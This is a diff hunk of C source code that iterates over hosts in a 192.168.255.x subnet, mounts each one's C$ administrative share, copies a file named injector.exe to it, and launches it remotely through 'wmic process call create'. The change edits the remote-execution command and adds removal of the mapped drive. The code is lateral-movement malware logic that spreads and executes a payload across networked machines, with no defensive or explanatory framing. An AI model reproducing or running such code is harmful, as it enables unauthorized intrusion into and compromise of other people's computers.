@@ -77,14 +77,17 @@ for (DWORD i = 0; i < entriesread; i++)
 		printf("%s\n", host);
 		snprintf(netuser, sizeof(netuser),"net use F: \\\\192.168.255.%d\\C$\\users\\saurav\\Downloads /user:saurav", i );
 		system(netuser);
+
 		system("copy c:\\users\\saurav\\Downloads\\injector.exe f:");
 		//snprintf(copyfile, sizeof(copyfile), );
-		snprintf(wmicrun, sizeof(wmicrun), "wmic /node:192.168.255.%d process call create '\\\\192.168.255.%d\\c$\\Users\\saurav\\Downloads\\injector.exe'", i, i );
+		snprintf(wmicrun, sizeof(wmicrun), "wmic /node:192.168.255.%d process call create 'c:\\Users\\saurav\\Downloads\\injector.exe'", i );
 		system(wmicrun);
 		
 	    //system("net use F: \\\\192.168.255.%d\\C$\\users\\saurav\\Downloads /user:saurav", i);
 		
         //system("wmic /node:@'192.168.255.%d' process call create '\\\\192.168.255.%d\\c$\\Users\\saurav\\Downloads\\injector.exe'", i);
+		snprintf(netuser, sizeof(netuser),"net use F: /delete");
+		system(netuser);
 	}
 
 
